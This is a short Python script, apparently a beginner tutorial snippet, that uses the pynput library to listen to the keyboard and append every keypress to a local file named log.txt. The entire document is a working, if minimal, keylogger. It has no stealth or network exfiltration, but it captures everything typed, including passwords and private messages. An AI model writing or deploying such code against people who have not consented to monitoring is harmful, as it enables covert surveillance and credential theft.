# Ensure you have installed this py  version 1.6.8
from pynput.keyboard import Listener


# ON_PRESS FUNCTION
def on_press(key):
    with open('log.txt','a') as f:      # Everytime the Key is pressed,puts in log.txt in append mode and saves as f
        f.write(str(key))

# Everytime a Key is pressed...calls function on_press

with Listener(on_press=on_press) as listener:
    listener.join()